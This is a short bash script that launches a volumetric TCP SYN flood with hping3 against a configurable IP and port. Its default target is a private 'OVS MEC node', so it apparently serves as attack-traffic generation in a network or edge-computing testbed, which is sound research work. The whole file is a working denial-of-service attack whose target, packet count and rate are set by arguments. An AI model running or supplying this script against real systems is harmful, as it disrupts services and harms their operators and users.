#!/usr/bin/env bash
# =============================================================================
# attack_syn_flood.sh
# Launches a volumetric TCP SYN Flood attack against the OVS MEC node using hping3.
# =============================================================================

set -u

TARGET_IP="${1:-${TARGET_IP:-10.200.0.10}}"
TARGET_PORT="${2:-8080}"
PACKET_COUNT="${3:-15000}"
INTERVAL_USEC="${4:-u100}"

echo "[ATTACK] Launching volumetric TCP SYN Flood against ${TARGET_IP}:${TARGET_PORT}..."
echo "[ATTACK] Parameters: count=${PACKET_COUNT}, interval=${INTERVAL_USEC}"

hping3 -S -p "${TARGET_PORT}" -i "${INTERVAL_USEC}" -c "${PACKET_COUNT}" "${TARGET_IP}" || true

echo "[ATTACK] TCP SYN Flood execution completed."
